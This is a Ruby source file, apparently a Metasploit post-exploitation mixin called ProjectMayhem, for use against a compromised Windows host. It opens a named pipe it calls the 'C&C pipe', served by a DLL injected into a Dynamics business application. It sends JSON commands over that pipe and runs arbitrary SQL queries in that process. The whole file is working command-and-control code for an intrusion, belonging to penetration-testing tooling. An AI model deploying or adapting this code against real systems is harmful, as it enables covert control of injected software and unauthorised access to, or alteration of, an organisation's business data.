# -*- coding: binary -*-
require 'msf/core/exploit/mssql_commands'

module Msf
class Post
module Windows

module ProjectMayhem

	include Exploit::Remote::MSSQL_COMMANDS

	def initialize(info = {})
		super
	end

	def connect
		pipe_h = session.railgun.kernel32.CreateFileA("\\\\.\\pipe\\mayhem", 'GENERIC_READ | GENERIC_WRITE', 0, nil, 'OPEN_EXISTING', 0, nil)
		if pipe_h['GetLastError'] != 0
			if pipe_h['GetLastError'] == 2
				raise RuntimeError.new("The C&C pipe is not available, ensure the dll has been injected")
			else
				raise RuntimeError.new("Could not open a handle to the C&C pipe")
			end
		end
		self.pipe_h = pipe_h['return']
		vprint_status("Checking status...")
		status = execute_command('status', ignore_errors = true)['status']
		if status != 0
			session.railgun.kernel32.CloseHandle(self.pipe_h)
			raise RuntimeError.new("The Dynamics process responded that it's not ready")
		end
		return
	end

	def execute_command(command, parameters = {}, ignore_errors = false)
		raise RuntimeError.new("Not connected to the C&C pipe") if self.pipe_h.nil?

		request_buffer = JSON.dump({'command' => command, 'parameters' => parameters})

		vprint_status("Sending command...")
		response = session.railgun.kernel32.WriteFile(self.pipe_h, [request_buffer.size].pack("V"), 4, 4, nil)
		raise RuntimeError.new("Failed to send request size") if response['GetLastError'] != 0
		response = session.railgun.kernel32.WriteFile(self.pipe_h, request_buffer, request_buffer.size, 4, nil)
		raise RuntimeError.new("Failed to send request data") if response['GetLastError'] != 0


		vprint_status("Retrieving results...")
		response = session.railgun.kernel32.ReadFile(self.pipe_h, 4, 4, 4, nil)
		raise RuntimeError.new("Failed to read response size") if response['GetLastError'] != 0
		response_length = response['lpBuffer'].unpack("V")[0]

		response = session.railgun.kernel32.ReadFile(self.pipe_h, response_length, response_length, 4, nil)
		raise RuntimeError.new("Failed to read response data") if response['GetLastError'] != 0
		result = JSON.parse(response['lpBuffer'])

		if result['status'] != 0 and not ignore_errors
			error_messages = {
				1 => 'Unknown Error',
				2 => 'No Handle',
				3 => 'Unknown Command',
				10 => 'Missing Parameter',
				11 => 'Invalid Parameter'
			}
			if error_messages.include?(result['status'])
				raise RuntimeError.new("Failed with error: \"#{error_messages[result['status']]}\"")
			end
			raise RuntimeError.new("Failed with an unknown error")
		end

		return result
	end

	def execute_query(sql_query)
		return execute_command('exec_query', {'query' => sql_query})['result']
	end

	def disconnect
		raise RuntimeError.new("Not connected to the C&C pipe") if self.pipe_h.nil?
		session.railgun.kernel32.CloseHandle(self.pipe_h)
	end

protected

	attr_accessor :pipe_h

end # ProjectMayhem
end # Windows
end # Post
end # Msf
